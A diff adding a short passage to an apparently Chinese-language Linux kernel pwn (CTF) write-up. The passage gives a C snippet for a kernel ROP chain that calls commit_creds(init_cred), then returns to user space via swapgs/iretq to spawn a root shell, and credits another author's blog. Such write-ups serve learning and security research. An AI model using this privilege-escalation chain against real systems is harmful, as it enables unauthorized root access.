@@ -372,6 +372,26 @@ struct tty_operations {
 
 传统的 ret2usr 失效，与之伴生的bypass-smep也随之失效
 
+而本题不用`bypass-smep`，直接在栈上走ROP也是可以的
+
+```c
+    rop[p++] = POP_RDI_RET;
+    rop[p++] = init_cred;
+    rop[p++] = commit_creds;
+    rop[p++] = SWAPGS_POP_RBP_RET;
+    rop[p++] = 0;
+    rop[p++] = IRETQ;
+    rop[p++] = (size_t)get_shell;
+    rop[p++] = user_cs;
+    rop[p++] = user_rflags;
+    rop[p++] = user_sp + 8;
+    rop[p++] = user_ss;
+```
+
+只是佬这么用了，我也跟着用了
+
+感谢佬https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/
+
 
 
 
